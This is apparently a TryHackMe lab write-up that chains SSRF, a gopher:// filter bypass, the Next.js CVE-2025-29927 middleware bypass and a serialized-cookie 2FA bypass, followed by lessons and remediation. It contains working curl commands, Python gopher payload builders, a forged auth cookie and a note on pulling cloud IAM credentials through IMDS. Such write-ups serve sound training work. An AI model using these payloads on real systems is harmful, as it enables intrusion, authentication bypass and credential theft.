# Extract — TryHackMe Writeup

> **Room:** [Extract](https://tryhackme.com/room/extract) · **Difficulty:** MAX (Hard)
> **Category:** Web (SSRF → gopher → Next.js middleware bypass → cookie tampering)
> **Author of writeup:** 0xnyx
> **Goal:** "Can you extract the secrets from the library?" — find and chain web vulnerabilities to pull two secrets out of the TryBookMe app.

> ⚠️ In line with TryHackMe's write-up policy, **no flags, passwords, or cracked values are included** — only the method.

---

## How to read this writeup

Each step is **Do** → **You get** → **Why / what next**. The chain is:

`SSRF (preview.php) → gopher:// (filter bypass, craft arbitrary requests) → Next.js /customapi middleware bypass (CVE-2025-29927) = flag 1 + creds → gopher login to localhost portal → PHP serialized auth_token cookie tamper (2FA bypass) = flag 2`

---

## Step 1 — Recon

**Do**

```bash
echo "<TARGET> extract.thm" | sudo tee -a /etc/hosts
nmap -sVC -T4 -Pn -p- --min-rate 2000 <TARGET>
curl -s http://<TARGET>/ | grep -iE "openPdf|preview.php|cvssm"
feroxbuster -u http://<TARGET>/ -w /usr/share/wordlists/dirb/common.txt -x php -d 2
```

**You get**

- **22** (SSH) + **80** (Apache 2.4.58, PHP app **"TryBookMe – Online Library"**).
- The homepage lists PDFs opened via `openPdf('http://cvssm1/pdf/dummy.pdf')` → the app fetches documents from an **internal host** → **SSRF** candidate.
- feroxbuster finds `/preview.php`, `/management/` (403 externally), `/pdf/`.

**Why / what next** — `preview.php` fetching a user-supplied URL is the way in. The `/management/` panel is forbidden from outside — remember it.

---

## Step 2 — Confirm SSRF + map the filter

**Do**

```bash
curl -s "http://<TARGET>/preview.php?url=http://cvssm1/pdf/dummy.pdf" | head        # returns the PDF -> SSRF works
curl -s "http://<TARGET>/preview.php?url=file:///etc/passwd"                        # blocked
curl -s "http://<TARGET>/preview.php?url=http://127.0.0.1/management/index.php"     # localhost -> login page!
```

**You get**

- `preview.php?url=` fetches **any** URL server-side (SSRF confirmed).
- A keyword blacklist blocks **`file:/`**, **`php://`**, **`dict://`** (`URL blocked due to keyword: …`).
- `http://127.0.0.1/management/` returns the **login page** (403 externally, but SSRF reaches it from localhost).

**Why / what next** — The blacklist missed a scheme. Test others:

```bash
curl -s "http://<TARGET>/preview.php?url=gopher://127.0.0.1:80/_GET"   # -> HTTP/1.1 400 from Apache
```

**`gopher://` is allowed.** gopher lets us send a **full raw HTTP request** (custom method, headers, cookies) to any internal service — `http://` SSRF can only do a plain GET.

---

## Step 3 — Flag 1: internal Next.js API + CVE-2025-29927

**Why** — There's an internal **Next.js** service on **port 10000** whose `/customapi` is gated by Next.js middleware. **CVE-2025-29927** lets you skip that middleware by adding the header `x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware`. Setting a header means we need **gopher**.

**Do** — Build a gopher payload carrying the bypass header. Because the SSRF param is URL-decoded once by PHP and once by cURL, **double-URL-encode** the request:

```python
import urllib.parse
req = ("GET /customapi HTTP/1.1\r\n"
       "Host: 127.0.0.1:10000\r\n"
       "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware\r\n"
       "Connection: close\r\n\r\n")
single = urllib.parse.quote(req, safe='')
double = urllib.parse.quote(single, safe='')
print(f"gopher://127.0.0.1:10000/_{double}")
```

```bash
curl -s "http://<TARGET>/preview.php?url=<gopher-double-encoded-payload>"
```

**You get** — The protected `/customapi` page renders:

- **Flag 1** (`THM{…}`), and
- leaked **librarian credentials**: `librarian:<PASSWORD>` (hinted as "add new books using librarian:…").

**Why / what next** — The creds are for the localhost-only management portal — our path to flag 2.

---

## Step 4 — Log in to the localhost management portal (via gopher)

**Do** — The portal is localhost-only, so POST the login through gopher and read the response headers:

```python
body = "username=librarian&password=<PASSWORD>"
req = ("POST /management/index.php HTTP/1.1\r\n"
       "Host: 127.0.0.1\r\n"
       "Content-Type: application/x-www-form-urlencoded\r\n"
       f"Content-Length: {len(body)}\r\n"
       "Connection: close\r\n\r\n" + body)
# double-encode -> gopher://127.0.0.1:80/_<double>
```

```bash
curl -s "http://<TARGET>/preview.php?url=<gopher-login-payload>"
```

**You get** — `HTTP/1.1 302 Found` with:

```
Set-Cookie: PHPSESSID=<id>; path=/
Set-Cookie: auth_token=O%3A9%3A%22AuthToken%22%3A1%3A%7Bs%3A9%3A%22validated%22%3Bb%3A0%3B%7D; …
Location: 2fa.php
```

The `auth_token` cookie is a **PHP-serialized object**, URL-decoded:

```php
O:9:"AuthToken":1:{s:9:"validated";b:0;}
```

`validated` is `b:0` (false) and the app redirects to **`2fa.php`**.

**Why / what next** — The 2FA "validated" state lives in a **client-side cookie** the server trusts blindly. Flip the boolean.

---

## Step 5 — Flag 2: tamper the serialized cookie (2FA bypass)

**Do** — Rebuild the cookie with `validated` set to `b:1`, URL-encode it, and send it (with the `PHPSESSID`) to `2fa.php` over gopher:

```
auth_token = O:9:"AuthToken":1:{s:9:"validated";b:1;}
```

```python
cookie = ('PHPSESSID=<id>; '
          'auth_token=O%3A9%3A%22AuthToken%22%3A1%3A%7Bs%3A9%3A%22validated%22%3Bb%3A1%3B%7D')
req = ("GET /management/2fa.php HTTP/1.1\r\n"
       "Host: 127.0.0.1\r\n"
       f"Cookie: {cookie}\r\n"
       "Connection: close\r\n\r\n")
# double-encode -> gopher://127.0.0.1:80/_<double>
```

```bash
curl -s "http://<TARGET>/preview.php?url=<gopher-2fa-payload>"
```

**You get** — `2fa.php` accepts the forged "validated" state and returns:

> **Congratulations! Here's the second flag: `THM{…}`**

Box's secrets fully extracted. 🏁

---

## (Aside) The SSRF also reaches AWS IMDS

The same SSRF reaches **`http://169.254.169.254/`** (EC2 Instance Metadata) — fetching `…/iam/security-credentials/vulnerable-machine` yields live **IAM temporary credentials**. The role's permissions are tightly scoped (every `List*` is denied), so it isn't the flag path here, but it shows how severe an unfiltered SSRF to a cloud host is — a real-world SSRF like this is often a full cloud-account compromise. Block link-local `169.254.169.254` and enforce **IMDSv2**.

---

## The full chain at a glance

| Step | Technique | Result |
|------|-----------|--------|
| 1–2 | Recon + SSRF `preview.php?url=` | SSRF; blacklist misses `gopher://` |
| 3 | gopher → Next.js `/customapi` + CVE-2025-29927 | Flag 1 + librarian creds |
| 4 | gopher login to localhost `/management/` | `auth_token` serialized cookie, `2fa.php` |
| 5 | Serialized-cookie tamper (`b:0`→`b:1`) | Flag 2 (2FA bypass) |
| — | SSRF → `169.254.169.254` (aside) | IAM creds (scoped; not required) |

## Lessons

- **Scheme blacklists don't stop SSRF.** Missing one scheme (`gopher://`) hands the attacker arbitrary internal HTTP requests — full method/header/cookie control that plain `http://` SSRF can't do. Use an allow-list (`https` to known hosts) and block internal/link-local targets.
- **gopher SSRF defeats "localhost-only".** Network isolation is not authentication; the portal was reachable and POST-able from the server itself.
- **CVE-2025-29927** — never rely on Next.js middleware as your only auth gate; the `x-middleware-subrequest` header bypasses it. Patch Next.js.
- **Never trust a client-side auth cookie.** A PHP-serialized `validated` flag in a cookie is attacker-controlled; keep auth/2FA state server-side and sign/encrypt anything that must live client-side.

## Remediation

- SSRF fetcher: strict scheme + host allow-list, block `169.254.169.254` and RFC1918, enforce IMDSv2.
- Upgrade Next.js to a CVE-2025-29927-patched version; don't gate sensitive routes on middleware alone.
- Move authentication/2FA state into server-side sessions; sign/encrypt cookies and never `unserialize()` attacker-controlled data.

---

*Write-up for [TryHackMe — Extract](https://tryhackme.com/room/extract).*
